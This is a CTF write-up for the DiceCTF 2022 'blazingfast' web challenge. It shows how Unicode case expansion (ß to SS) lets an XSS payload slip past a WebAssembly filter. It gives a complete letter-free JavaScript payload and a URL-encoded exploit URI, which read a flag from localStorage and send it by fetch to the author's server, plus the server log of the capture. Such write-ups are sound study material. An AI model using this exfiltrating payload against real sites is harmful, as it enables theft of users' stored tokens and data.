+++
Title = "DiceCTF 2022: blazingfast"
description = "Writeup for blazingfast challenge in DiceCTF 2022"
aliases = [ "/p/dctf22-blazingfast" ]
+++

One of the challenges in [DiceCTF 2022](https://ctf.dicega.ng/) was [`web/blazingfast`](https://blazingfast.mc.ax/). It converts text you write InTo tExT LiKe tHiS. The main logic is implemented in WebAssembly, but [the C source code](https://static.dicega.ng/uploads/209c5168fc160763f28a23f23280f921c7e544fb87323726e48584b89d774825/blazingfast.c) is provided[^re]. If we try to input an XSS payload, it detects this and the output is `No XSS for you!`.

[^re]: Although I didn't realize that at first, and spent a considerable amount of time reverse engineering the WASM module.

There is an admin bot that will visit a URI you specify with a flag in `localStorage`, and we can use the `demo` URI parameter to make the admin mock text of our choosing.

Capitalization is one of those things that seems simple if you approach it from an ASCII-centric perspective, but capitalization works in weird ways in some languages. In German, "ß" in lowercase is "SS" in uppercase. Some precomposed ligatures have similar behavior: "ﬃ" (that's a single letter) uppercases to "FFI" (that's three letters). Let's see how this challenge handles those characters: `ßßßßß` gets mocked incorrectly as `SsSsSSSSSS`. The last half of the input didn't get mocked!

The unmocked second half is due to a mismatch length handling in the WASM glue code. It starts by sending the length of the string to the WASM module. Next, it converts the string to all uppercase, since the WASM module works by lowercasing the appropriate letters &mdash; it assumes the input is already all uppercase. This means that the rest of the string isn't mocked. This is great for us, since the loop that mocks the string also has an XSS check: `buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"'`. This *would* be an effective check if it were run against every character. But since it isn't, we can stick an XSS payload at the end.

There's one problem with our XSS payload though: it gets converted to all uppercase. We need to write an XSS payload that doesn't use any lowercase letters. I later learned that you could do this pretty easily with escape sequences, but I did this a more convoluted way. It is possible to execute arbitrary JavaScript payloads using only symbols. [JSFuck](http://www.jsfuck.com/) can transpile any JavaScript to JavaScript with just six symbols. Unfortunately, the generated JS is often very long, and there is a length limit of 1000 characters in the WASM glue code. As such, my solution is based on what JSFuck does, but takes advantage of more characters.

Here, we create a bunch of single character variables using things createable without letters. We can use `''+!0` to get `"false"`, `''+!1` for `"true"`, `[][0]+''`, for `"undefined"`, then extract characters by indexing into those strings. We can use those characters to access parts of objects to get even more strings available to index from. Note that this relies on native functions being stringified in specific ways, so this is Chromium-specific.

```js
UN=[][0]+'';FL=(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]];F=([][FL]+'');
C=F[3];O=F[27];N=UN[1];S=(''+!1)[3];T=F[21];R=(!0+'')[1];U=UN[0];E=F[29];L=(!1+'')[2];A=(!1+'')[1];
CON=C+O+N+S+T+R+U+C+T+O+R;
G=(''+''[CON])[14];F=F[0];M=((0)[CON]+'')[11];H=(+(101))[T+O+''[CON][N+A+M+E]](21)[1];
```

Next, we need to access two globals: `localStorage` which has the flag, and `fetch` to send data to our server. We can't directly index on `window` (since that's spelt with lowercase letters). We can get the `Function` global by getting the `constructor` property on a function we create. Then we can pass a string to `Function` to create a function with the contents of that string (similar to `eval`), then call that new function. We can access globals that way:

```js
FN=(()=>{})[CON];
[LS,FE]=FN(R+E+T+U+R+N+' ['+L+O+C+A+L+'S'+T+O+R+A+G+E+','+F+E+T+C+H+']')();
```

Next, we extract the flag from `localStorage` and send it to our server. Conveniently the hostname and protocol of URLs are case-insensitive.

```js
FE('HTTPS://BOX.SMITOP.COM/'+LS[F+L+A+G]);
```

Now we've got our JavaScript, let's format it into an exploit URI. We URL-encode the script and put it into an image tag after 500 ßs: `https://blazingfast.mc.ax/?demo=[500 ß]<IMG SRC="" ONERROR="[script]">`. This gives us our final URI to send to the admin bot:

```
https://blazingfast.mc.ax/?demo=%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%3CIMG%20SRC=%22%22%20ONERROR=%22UN%3D%5B%5D%5B0%5D%2B%27%27%3BFL%3D(!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B!%2B%5B%5D%2B!%2B%5B%5D%5D%2B(!%5B%5D%2B%5B%5D)%5B%2B!%2B%5B%5D%5D%2B(!!%5B%5D%2B%5B%5D)%5B%2B%5B%5D%5D%3BF%3D(%5B%5D%5BFL%5D%2B%27%27)%3BC%3DF%5B3%5D%3BO%3DF%5B27%5D%3BN%3DUN%5B1%5D%3BS%3D(%27%27%2B!1)%5B3%5D%3BT%3DF%5B21%5D%3BR%3D(!0%2B%27%27)%5B1%5D%3BU%3DUN%5B0%5D%3BE%3DF%5B29%5D%3BL%3D(!1%2B%27%27)%5B2%5D%3BA%3D(!1%2B%27%27)%5B1%5D%3BCON%3DC%2BO%2BN%2BS%2BT%2BR%2BU%2BC%2BT%2BO%2BR%3BG%3D(%27%27%2B%27%27%5BCON%5D)%5B14%5D%3BF%3DF%5B0%5D%3BM%3D((0)%5BCON%5D%2B%27%27)%5B11%5D%3BH%3D(%2B(101))%5BT%2BO%2B%27%27%5BCON%5D%5BN%2BA%2BM%2BE%5D%5D(21)%5B1%5D%3BFN%3D(()%3D%3E%7B%7D)%5BCON%5D%3B%5BLS%2CFE%5D%3DFN(R%2BE%2BT%2BU%2BR%2BN%2B%27%20%5B%27%2BL%2BO%2BC%2BA%2BL%2B%27S%27%2BT%2BO%2BR%2BA%2BG%2BE%2B%27%2C%27%2BF%2BE%2BT%2BC%2BH%2B%27%5D%27)()%3BFE(%27HTTPS%3A%2F%2FBOX.SMITOP.COM%2F%27%2BLS%5BF%2BL%2BA%2BG%5D)%3B%22%3E
```

I then watched the request log on my server to get the flag:

```
2022/02/06 11:20:55 [error] 7483#7483: *33969 open() "/home/user-data/www/default/dice{1_dont_know_how_to_write_wasm_pwn_s0rry}" failed (2: No such file or directory), client: 34.139.106.105, server: box.smitop.com, request: "GET /dice%7B1_dont_know_how_to_write_wasm_pwn_s0rry%7D HTTP/2.0", host: "box.smitop.com", referrer: "https://blazingfast.mc.ax/"</code>
```
